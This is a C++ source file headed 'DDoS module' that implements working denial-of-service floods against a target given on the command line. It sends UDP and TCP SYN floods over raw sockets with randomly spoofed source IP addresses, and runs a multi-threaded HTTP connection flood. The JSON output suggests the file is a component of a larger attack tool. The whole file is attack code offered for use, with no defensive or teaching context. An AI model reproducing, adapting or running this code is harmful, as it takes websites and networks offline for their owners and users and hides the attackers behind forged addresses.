// flood.cpp — DDoS module: UDP/TCP/HTTP flood
// Usage: ./flood type=<udp|tcp|http> target=<ip> port=<p> threads=<n> duration=<s> [size=<bytes>]

#include <arpa/inet.h>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <string>
#include <sys/socket.h>
#include <thread>
#include <unistd.h>
#include <vector>

// ── Checksum ─────────────────────────────────────────────
static unsigned short csum(unsigned short* buf, int nwords) {
    unsigned long sum = 0;
    for (; nwords > 0; nwords--) sum += *buf++;
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

// ── UDP Flood ────────────────────────────────────────────
static void udp_flood(const char* target_ip, int target_port, int packet_size, int duration) {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        std::fprintf(stdout, "{\"error\":\"raw socket failed (need root)\"}\n");
        return;
    }

    char* packet = new char[packet_size];
    iphdr* iph = (iphdr*)packet;
    udphdr* udph = (udphdr*)(packet + sizeof(iphdr));

    sockaddr_in sin{};
    sin.sin_family = AF_INET;
    sin.sin_port = htons(target_port);
    inet_pton(AF_INET, target_ip, &sin.sin_addr);

    time_t end = time(nullptr) + duration;
    int sent = 0;

    while (time(nullptr) < end) {
        std::memset(packet, 0, packet_size);
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = htons(packet_size);
        iph->id = htons(rand() % 65535);
        iph->frag_off = 0;
        iph->ttl = 64;
        iph->protocol = IPPROTO_UDP;
        iph->saddr = rand();
        iph->daddr = sin.sin_addr.s_addr;
        iph->check = csum((unsigned short*)packet, sizeof(iphdr) / 2);

        udph->source = htons(rand() % 65535);
        udph->dest = htons(target_port);
        udph->len = htons(packet_size - sizeof(iphdr));
        udph->check = 0;

        sendto(sock, packet, packet_size, 0, (sockaddr*)&sin, sizeof(sin));
        sent++;
    }

    close(sock);
    delete[] packet;
    std::fprintf(stdout, "{\"sent\":%d,\"type\":\"udp\"}\n", sent);
}

// ── TCP SYN Flood ────────────────────────────────────────
static void tcp_flood(const char* target_ip, int target_port, int duration) {
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) {
        std::fprintf(stdout, "{\"error\":\"raw socket failed (need root)\"}\n");
        return;
    }

    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    int packet_size = sizeof(iphdr) + sizeof(tcphdr);
    char* packet = new char[packet_size];
    iphdr* iph = (iphdr*)packet;
    tcphdr* tcph = (tcphdr*)(packet + sizeof(iphdr));

    sockaddr_in sin{};
    sin.sin_family = AF_INET;
    sin.sin_port = htons(target_port);
    inet_pton(AF_INET, target_ip, &sin.sin_addr);

    time_t end = time(nullptr) + duration;
    int sent = 0;

    while (time(nullptr) < end) {
        std::memset(packet, 0, packet_size);
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = htons(packet_size);
        iph->id = htons(rand() % 65535);
        iph->frag_off = 0;
        iph->ttl = 64;
        iph->protocol = IPPROTO_TCP;
        iph->saddr = rand();
        iph->daddr = sin.sin_addr.s_addr;
        iph->check = csum((unsigned short*)packet, sizeof(iphdr) / 2);

        tcph->source = htons(rand() % 65535);
        tcph->dest = htons(target_port);
        tcph->seq = htonl(rand());
        tcph->ack_seq = 0;
        tcph->doff = 5;
        tcph->syn = 1;
        tcph->window = htons(65535);
        tcph->check = 0;

        sendto(sock, packet, packet_size, 0, (sockaddr*)&sin, sizeof(sin));
        sent++;
    }

    close(sock);
    delete[] packet;
    std::fprintf(stdout, "{\"sent\":%d,\"type\":\"tcp_syn\"}\n", sent);
}

// ── HTTP Flood ───────────────────────────────────────────
static void http_flood(const char* target_ip, int target_port, int threads, int duration) {
    std::vector<std::thread> workers;
    for (int i = 0; i < threads; ++i) {
        workers.emplace_back([=]() {
            time_t end = time(nullptr) + duration;
            while (time(nullptr) < end) {
                int sock = socket(AF_INET, SOCK_STREAM, 0);
                if (sock < 0) continue;

                sockaddr_in sin{};
                sin.sin_family = AF_INET;
                sin.sin_port = htons(target_port);
                inet_pton(AF_INET, target_ip, &sin.sin_addr);

                timeval tv{1, 0};
                setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

                if (connect(sock, (sockaddr*)&sin, sizeof(sin)) == 0) {
                    const char* req = "GET / HTTP/1.1\r\nHost: %s\r\nConnection: keep-alive\r\n\r\n";
                    char buf[512];
                    std::snprintf(buf, sizeof(buf), req, target_ip);
                    send(sock, buf, std::strlen(buf), MSG_NOSIGNAL);
                }
                close(sock);
            }
        });
    }
    for (auto& t : workers) t.join();
    std::fprintf(stdout, "{\"type\":\"http\",\"threads\":%d,\"duration\":%d}\n", threads, duration);
}

// ── Param parser ─────────────────────────────────────────
static std::string get_param(int argc, char* argv[], const char* key, const char* def = "") {
    std::string prefix = std::string(key) + "=";
    for (int i = 1; i < argc; ++i) {
        std::string arg(argv[i]);
        if (arg.find(prefix) == 0) return arg.substr(prefix.length());
    }
    return def;
}

int main(int argc, char* argv[]) {
    if (argc < 2) {
        std::fprintf(stdout, "{\"error\":\"Usage: %s type=<udp|tcp|http> target=<ip> port=<p> threads=<n> duration=<s> [size=<bytes>]\"}\n", argv[0]);
        return 1;
    }

    std::string type = get_param(argc, argv, "type", "udp");
    std::string target = get_param(argc, argv, "target", "127.0.0.1");
    int port = std::atoi(get_param(argc, argv, "port", "80").c_str());
    int threads = std::atoi(get_param(argc, argv, "threads", "1").c_str());
    int duration = std::atoi(get_param(argc, argv, "duration", "10").c_str());
    int size = std::atoi(get_param(argc, argv, "size", "1024").c_str());

    if (type == "udp") {
        udp_flood(target.c_str(), port, size, duration);
    } else if (type == "tcp" || type == "syn") {
        tcp_flood(target.c_str(), port, duration);
    } else if (type == "http") {
        http_flood(target.c_str(), port, threads, duration);
    } else {
        std::fprintf(stdout, "{\"error\":\"unknown flood type: %s\"}\n", type.c_str());
        return 1;
    }

    return 0;
}
